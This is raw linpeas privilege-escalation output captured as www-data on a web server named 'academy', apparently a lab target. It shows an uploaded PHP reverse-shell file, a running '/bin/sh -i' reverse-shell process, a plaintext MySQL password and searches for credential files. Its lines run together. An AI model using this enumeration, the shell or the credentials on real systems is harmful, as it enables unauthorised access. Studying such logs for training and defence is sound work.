inside readable .db/.sqlite files (limit 100)                                                                                                                                                               [+] Web files?(output limit)/var/www/:                                                                                                                                                     total 12Kdrwxr-xr-x  3 root root 4.0K May 29  2021 .drwxr-xr-x 12 root root 4.0K May 29  2021 ..drwxr-xr-x  3 root root 4.0K May 29  2021 html/var/www/html:total 24Kdrwxr-xr-x 3 root     root     4.0K May 29  2021 .drwxr-xr-x 3 root     root     4.0K May 29  2021 ..[+] *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .gitconfig, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml                                                                                                                                                   [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                                                            -rw-r--r-- 1 root root 1994 Apr 18  2019 /etc/bash.bashrc                                                                                                      -rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile-rw-r--r-- 1 root root 2778 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc-rw-r--r-- 1 root root 802 Jun 26  2016 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)   139266      4 -rw-r--r--   1 grimmie  administrator      220 May 29  2021 /home/grimmie/.bash_logout                                                           270249      4 -rw-r--r--   1 root     root               240 Oct 15  2020 /usr/share/phpmyadmin/vendor/paragonie/constant_time_encoding/.travis.yml   270133      4 -rw-r--r--   1 root     root               250 Oct 15  2020 /usr/share/phpmyadmin/vendor/bacon/bacon-qr-code/.travis.yml   389530      4 -rw-r--r--   1 root     root               946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml   389531      4 -rw-r--r--   1 root     root               706 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.travis.yml   140294      4 -rw-r--r--   1 root     root               608 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/extensions/.travis.yml   140341      4 -rw-r--r--   1 root     root              1004 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.travis.yml   140340      4 -rw-r--r--   1 root     root               799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist   140339      4 -rw-r--r--   1 root     root               224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig   270226      4 -rw-r--r--   1 root     root               633 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.travis.yml   138381      0 -rw-r--r--   1 root     root                 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch    12136      0 -rw-r--r--   1 root     root                 0 Jul 29  2023 /run/network/.ifstate.lock   260079      0 -rw-------   1 root     root                 0 May 29  2021 /etc/.pwd.lock   259843      4 -rw-r--r--   1 root     root               220 Apr 18  2019 /etc/skel/.bash_logout[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)-rwxrwxrwx 1 www-data www-data 134167 Jul 29 06:32 /tmp/linpeas.sh                                                                                             -rw-r--r-- 1 root root 11996 May 29  2021 /var/backups/apt.extended_states.0[+] Interesting writable Files[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                                                                 /dev/mqueue                                                                                                                                                    /dev/mqueue/linpeas.txt/dev/shm/run/lock/run/lock/apache2/sys/kernel/security/apparmor/.access/sys/kernel/security/apparmor/.load/sys/kernel/security/apparmor/.remove/sys/kernel/security/apparmor/.replace/tmp/tmp/linpeas.sh/var/cache/apache2/mod_cache_disk/var/lib/php/sessions/var/lib/phpmyadmin/var/lib/phpmyadmin/tmp/var/lib/phpmyadmin/tmp/twig/var/lib/phpmyadmin/tmp/twig/15/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php/var/lib/phpmyadmin/tmp/twig/21/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php/var/lib/phpmyadmin/tmp/twig/22/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php/var/lib/phpmyadmin/tmp/twig/28/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php/var/lib/phpmyadmin/tmp/twig/2e/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php/var/lib/phpmyadmin/tmp/twig/31/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php/var/lib/phpmyadmin/tmp/twig/36/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php/var/lib/phpmyadmin/tmp/twig/3b/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php/var/lib/phpmyadmin/tmp/twig/41/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php/var/lib/phpmyadmin/tmp/twig/42/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php/var/lib/phpmyadmin/tmp/twig/43/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php/var/lib/phpmyadmin/tmp/twig/4c/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php/var/lib/phpmyadmin/tmp/twig/4e/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php/var/lib/phpmyadmin/tmp/twig/4f/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php/var/lib/phpmyadmin/tmp/twig/53/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php/var/lib/phpmyadmin/tmp/twig/5c/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php/var/lib/phpmyadmin/tmp/twig/61/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php/var/lib/phpmyadmin/tmp/twig/6b/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php/var/lib/phpmyadmin/tmp/twig/6c/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php/var/lib/phpmyadmin/tmp/twig/73/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php/var/lib/phpmyadmin/tmp/twig/78/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php/var/lib/phpmyadmin/tmp/twig/7d/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php/var/lib/phpmyadmin/tmp/twig/7f/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php/var/lib/phpmyadmin/tmp/twig/8a/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php/var/lib/phpmyadmin/tmp/twig/8b/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php/var/lib/phpmyadmin/tmp/twig/96/var/lib/phpmyadmin/tmp/twig/96/96885525f00ce10c76c38335c2cf2e232a709122ae75937b4f2eafcdde7be991.php/var/lib/phpmyadmin/tmp/twig/97/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php/var/lib/phpmyadmin/tmp/twig/99/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php/var/lib/phpmyadmin/tmp/twig/9d/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php/var/lib/phpmyadmin/tmp/twig/9e/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php/var/lib/phpmyadmin/tmp/twig/a0/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php/var/lib/phpmyadmin/tmp/twig/a4/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php/var/lib/phpmyadmin/tmp/twig/a7/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php/var/lib/phpmyadmin/tmp/twig/ae/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php/var/lib/phpmyadmin/tmp/twig/af/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php/var/lib/phpmyadmin/tmp/twig/b6/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php/var/lib/phpmyadmin/tmp/twig/c3/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php/var/lib/phpmyadmin/tmp/twig/c5/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php/var/lib/phpmyadmin/tmp/twig/c7/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php/var/lib/phpmyadmin/tmp/twig/ca/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php/var/lib/phpmyadmin/tmp/twig/d6/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php/var/lib/phpmyadmin/tmp/twig/dd/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php/var/lib/phpmyadmin/tmp/twig/e8/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php/var/lib/phpmyadmin/tmp/twig/e9/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php/var/lib/phpmyadmin/tmp/twig/f5/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php/var/lib/phpmyadmin/tmp/twig/fa/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php/var/tmp/var/www/html/academy/var/www/html/academy/admin/var/www/html/academy/admin/assets/var/www/html/academy/admin/assets/css/var/www/html/academy/admin/assets/css/bootstrap.css/var/www/html/academy/admin/assets/css/font-awesome.css/var/www/html/academy/admin/assets/css/style.css/var/www/html/academy/admin/assets/fonts/var/www/html/academy/admin/assets/fonts/FontAwesome.otf/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.svg/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.eot/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.svg/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.ttf/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff/var/www/html/academy/admin/assets/fonts/glyphicons-halflings-regular.woff2/var/www/html/academy/admin/assets/img/var/www/html/academy/admin/assets/js/var/www/html/academy/admin/assets/js/bootstrap.js/var/www/html/academy/admin/assets/js/jquery-1.11.1.js/var/www/html/academy/admin/change-password.php/var/www/html/academy/admin/check_availability.php/var/www/html/academy/admin/course.php/var/www/html/academy/admin/department.php/var/www/html/academy/admin/edit-course.php/var/www/html/academy/admin/enroll-history.php/var/www/html/academy/admin/includes/var/www/html/academy/admin/includes/config.php/var/www/html/academy/admin/includes/footer.php/var/www/html/academy/admin/includes/header.php/var/www/html/academy/admin/includes/menubar.php/var/www/html/academy/admin/index.php/var/www/html/academy/admin/level.php/var/www/html/academy/admin/logout.php/var/www/html/academy/admin/manage-students.php/var/www/html/academy/admin/print.php/var/www/html/academy/admin/semester.php/var/www/html/academy/admin/session.php/var/www/html/academy/admin/student-registration.php/var/www/html/academy/admin/user-log.php/var/www/html/academy/assets/var/www/html/academy/assets/css/var/www/html/academy/assets/css/bootstrap.css/var/www/html/academy/assets/css/font-awesome.css/var/www/html/academy/assets/css/style.css/var/www/html/academy/assets/fonts/var/www/html/academy/assets/fonts/FontAwesome.otf/var/www/html/academy/assets/fonts/fontawesome-webfont.eot/var/www/html/academy/assets/fonts/fontawesome-webfont.svg/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf/var/www/html/academy/assets/fonts/fontawesome-webfont.woff/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.eot/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.svg/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.ttf/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff/var/www/html/academy/assets/fonts/glyphicons-halflings-regular.woff2/var/www/html/academy/assets/img/var/www/html/academy/assets/js/var/www/html/academy/assets/js/bootstrap.js/var/www/html/academy/assets/js/jquery-1.11.1.js/var/www/html/academy/change-password.php/var/www/html/academy/check_availability.php/var/www/html/academy/db/var/www/html/academy/db/onlinecourse.sql/var/www/html/academy/enroll-history.php/var/www/html/academy/enroll.php/var/www/html/academy/includes/var/www/html/academy/includes/config.php/var/www/html/academy/includes/footer.php/var/www/html/academy/includes/header.php/var/www/html/academy/includes/menubar.php/var/www/html/academy/index.php/var/www/html/academy/logout.php/var/www/html/academy/my-profile.php/var/www/html/academy/pincode-verification.php/var/www/html/academy/print.php/var/www/html/academy/studentphoto/var/www/html/academy/studentphoto/php-rev.php/tmp/linpeas.sh/dev/mqueue/linpeas.txt[+] Searching passwords in config PHP files$mysql_password = "My_V3ryS3cur3_P4ss";                                                                                                                        $mysql_password = "My_V3ryS3cur3_P4ss";[+] Finding IPs inside logs (limit 100)     44 /var/log/dpkg.log.1:1.8.2.1                                                                                                                                 24 /var/log/dpkg.log.1:1.8.2.3     14 /var/log/dpkg.log.1:1.8.4.3      9 /var/log/wtmp:192.168.10.31      7 /var/log/dpkg.log.1:7.43.0.2      7 /var/log/dpkg.log.1:4.8.6.1      7 /var/log/dpkg.log.1:1.7.3.2      7 /var/log/dpkg.log.1:0.5.10.2      7 /var/log/dpkg.log.1:0.19.8.1      4 /var/log/installer/status:1.2.3.3      1 /var/log/lastlog:192.168.10.31[+] Finding passwords inside logs (limit 100)/var/log/dpkg.log.1:2021-05-29 17:00:10 install base-passwd:amd64 <none> 3.5.46                                                                                /var/log/dpkg.log.1:2021-05-29 17:00:10 status half-installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:21 install passwd:amd64 <none> 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 <none>/var/log/dpkg.log.1:2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46/var/log/dpkg.log.1:2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 <none>/var/log/dpkg.log.1:2021-05-29 17:00:25 status half-configured passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1/var/log/dpkg.log.1:2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1/var/log/installer/status:Description: Set up users and passwords[+] Finding emails inside logs (limit 100)      1 /var/log/installer/status:aeb@debian.org                                                                                                                     1 /var/log/installer/status:anibal@debian.org      2 /var/log/installer/status:berni@debian.org     40 /var/log/installer/status:debian-boot@lists.debian.org     16 /var/log/installer/status:debian-kernel@lists.debian.org      1 /var/log/installer/status:debian-med-packaging@lists.alioth.debian.org      1 /var/log/installer/status:debian@jff.email      1 /var/log/installer/status:djpig@debian.org      4 /var/log/installer/status:gcs@debian.org      2 /var/log/installer/status:guillem@debian.org      1 /var/log/installer/status:guus@debian.org      1 /var/log/installer/status:linux-xfs@vger.kernel.org      2 /var/log/installer/status:mmind@debian.org      1 /var/log/installer/status:open-iscsi@packages.debian.org      1 /var/log/installer/status:open-isns@packages.debian.org      1 /var/log/installer/status:packages@release.debian.org      2 /var/log/installer/status:parted-maintainers@alioth-lists.debian.net      1 /var/log/installer/status:petere@debian.org      2 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org      1 /var/log/installer/status:pkg-gnutls-maint@lists.alioth.debian.org      1 /var/log/installer/status:pkg-grub-devel@alioth-lists.debian.net      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org      1 /var/log/installer/status:rogershimizu@gmail.com      2 /var/log/installer/status:team+lvm@tracker.debian.org      1 /var/log/installer/status:tytso@mit.edu      1 /var/log/installer/status:wpa@packages.debian.org      1 /var/log/installer/status:xnox@debian.org[+] Finding *password* or *credential* files in home                                                                                                                                                               [+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2                                                                                             /var/www/html/academy/admin/assets/js/jquery-1.11.1.js/var/www/html/academy/admin/change-password.php/var/www/html/academy/admin/includes/config.php/var/www/html/academy/admin/index.php/var/www/html/academy/admin/manage-students.php/var/www/html/academy/admin/student-registration.php/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2/var/www/html/academy/assets/js/jquery-1.11.1.js/var/www/html/academy/change-password.php/var/www/html/academy/db/onlinecourse.sql/var/www/html/academy/includes/config.php/var/www/html/academy/includes/menubar.php/var/www/html/academy/index.php/var/www/html/academy/pincode-verification.php/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'./etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries/etc/debconf.conf:Accept-Type: password/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat/etc/debconf.conf:Name: passwords/etc/debconf.conf:Reject-Type: password/etc/debconf.conf:Stack: config, passwordsLinux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist LEYEND:                                                                                                                                                         RED/YELLOW: 99% a PE vector  RED: You must take a look at it  LightCyan: Users with console  Blue: Users without console & mounted devs  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)   LightMangenta: Your username====================================( Basic information )=====================================OS: Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                  User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)Hostname: academyWritable folder: /dev/shm[+] /usr/bin/ping is available for network discovery (You can use linpeas to discover hosts, learn more with -h)[+] /usr/bin/nc is available for network discover & port scanning (You can use linpeas to discover hosts/port scanning, learn more with -h)                                                                                                                                                                                   ====================================( System Information )====================================[+] Operative system                                                                                                                                           [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.181-1 (2021-03-19)                      Distributor ID: DebianDescription:    Debian GNU/Linux 10 (buster)Release:        10Codename:       buster[+] Sudo versionsudo Not Found                                                                                                                                                                                                                                                                                                                [+] PATH[i] Any writable folder in original PATH? (a new completed path will be exported)                                                                              /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                   New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin[+] DateSat Jul 29 06:37:17 EDT 2023                                                                                                                                   [+] System statsFilesystem      Size  Used Avail Use% Mounted on                                                                                                               /dev/sda1       6.9G  1.9G  4.7G  29% /udev            479M     0  479M   0% /devtmpfs           494M     0  494M   0% /dev/shmtmpfs            99M  4.3M   95M   5% /runtmpfs           5.0M     0  5.0M   0% /run/locktmpfs           494M     0  494M   0% /sys/fs/cgrouptmpfs            99M     0   99M   0% /run/user/0              total        used        free      shared  buff/cache   availableMem:        1009960      178916      474532       10816      356512      640884Swap:        998396           0      998396[+] Environment[i] Any private information inside environment variables?                                                                                                      HISTFILESIZE=0                                                                                                                                                 APACHE_RUN_DIR=/var/run/apache2APACHE_PID_FILE=/var/run/apache2/apache2.pidJOURNAL_STREAM=9:13967PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binINVOCATION_ID=d29a7dcbdfb3443ebe10d76ee30417d9APACHE_LOCK_DIR=/var/lock/apache2LANG=CHISTSIZE=0APACHE_RUN_USER=www-dataAPACHE_RUN_GROUP=www-dataAPACHE_LOG_DIR=/var/log/apache2HISTFILE=/dev/null[+] Looking for Signature verification failed in dmseg Not Found                                                                                                                                                                                                                                                                                                                    [+] selinux enabled? .......... sestatus Not Found[+] Printer? .......... lpstat Not Found                                                                                                                       [+] Is this a container? .......... No                                                                                                                         [+] Is ASLR enabled? .......... Yes                                                                                                                            =========================================( Devices )==========================================[+] Any sd* disk in /dev? (limit 20)                                                                                                                           sda                                                                                                                                                            sda1sda2sda5[+] Unmounted file-system?[i] Check if you can mount umounted devices                                                                                                                    UUID=24d0cea7-c37b-4fd6-838e-d05cfb61a601 /               ext4    errors=remount-ro 0       1                                                                  UUID=930c51cc-089d-42bd-8e30-f08b86c52dca none            swap    sw              0       0/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0====================================( Available Software )====================================[+] Useful software?                                                                                                                                           /usr/bin/nc                                                                                                                                                    /usr/bin/netcat/usr/bin/nc.traditional/usr/bin/wget/usr/bin/ping/usr/bin/base64/usr/bin/socat/usr/bin/python/usr/bin/python2/usr/bin/python3/usr/bin/python2.7/usr/bin/python3.7/usr/bin/perl/usr/bin/php[+] Installed compilers?Compilers Not Found                                                                                                                                                                                                                                                                                                           ================================( Processes, Cron & Services )================================[+] Cleaned processes                                                                                                                                          [i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                       USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                                                                       root         1  0.0  0.9 103796  9972 ?        Ss   05:18   0:01 /sbin/initroot       324  0.0  0.7  40376  7976 ?        Ss   05:18   0:00 /lib/systemd/systemd-journaldroot       349  0.0  0.4  21932  4952 ?        Ss   05:18   0:00 /lib/systemd/systemd-udevdsystemd+   434  0.0  0.6  93084  6556 ?        Ssl  05:18   0:00 /lib/systemd/systemd-timesyncdroot       465  0.0  0.2   8504  2736 ?        Ss   05:18   0:00 /usr/sbin/cron -froot       470  0.0  0.7  19492  7244 ?        Ss   05:18   0:00 /lib/systemd/systemd-logindmessage+   472  0.0  0.4   8980  4348 ?        Ss   05:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-onlyroot       473  0.0  0.4 225824  4332 ?        Ssl  05:18   0:00 /usr/sbin/rsyslogd -n -iNONEroot       475  0.0  0.2   6620  2808 ?        Ss   05:18   0:00 /usr/sbin/vsftpd /etc/vsftpd.confroot       477  0.0  0.3   6924  3376 tty1     Ss   05:18   0:00 /bin/login -p --root       486  0.0  0.6  15852  6876 ?        Ss   05:18   0:00 /usr/sbin/sshd -Droot       521  0.0  2.2 214992 23008 ?        Ss   05:18   0:00 /usr/sbin/apache2 -k startmysql      541  0.0  8.9 1274452 90652 ?       Ssl  05:18   0:03 /usr/sbin/mysqldwww-data   544  0.0  1.2 215348 13032 ?        S    05:18   0:00 /usr/sbin/apache2 -k startroot       634  0.0  0.8  21024  8488 ?        Ss   05:18   0:00 /lib/systemd/systemd --userroot       635  0.0  0.2  22832  2264 ?        S    05:18   0:00 (sd-pam)root       639  0.0  0.4   7652  4444 tty1     S+   05:18   0:00 -bashroot       643  0.0  0.5   9488  5592 ?        Ss   05:18   0:00 dhclientroot      1051  0.0  0.5   9488  5688 ?        Ss   06:07   0:00 dhclientwww-data  1075  0.0  1.2 215340 13024 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1128  0.0  1.6 215340 17168 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1129  0.0  1.9 215460 19852 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1137  0.0  1.9 215460 19540 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1147  0.0  1.9 215460 19652 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1151  0.0  2.3 218640 23700 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1157  0.0  1.2 215348 12772 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1163  0.0  1.2 215340 12756 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1172  0.0  1.9 215576 19836 ?        S    06:07   0:00 /usr/sbin/apache2 -k startwww-data  1583  0.0  0.0   2388   756 ?        S    06:33   0:00 sh -c uname -a; w; id; /bin/sh -iwww-data  1587  0.0  0.0   2388   752 ?        S    06:33   0:00 /bin/sh -iwww-data  1624  1.0  0.1   2520  1628 ?        S    06:37   0:00 /bin/sh ./linpeas.shwww-data  1805  0.0  0.2   7640  2728 ?        R    06:37   0:00 ps aux[+] Binary processes permissions[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                       56K -rwxr-xr-x 1 root root  56K Jul 27  2018 /bin/login                                                                                                          0 lrwxrwxrwx 1 root root    4 May 29  2021 /bin/sh -> dash1.5M -rwxr-xr-x 1 root root 1.5M Mar 18  2021 /lib/systemd/systemd144K -rwxr-xr-x 1 root root 143K Mar 18  2021 /lib/systemd/systemd-journald228K -rwxr-xr-x 1 root root 227K 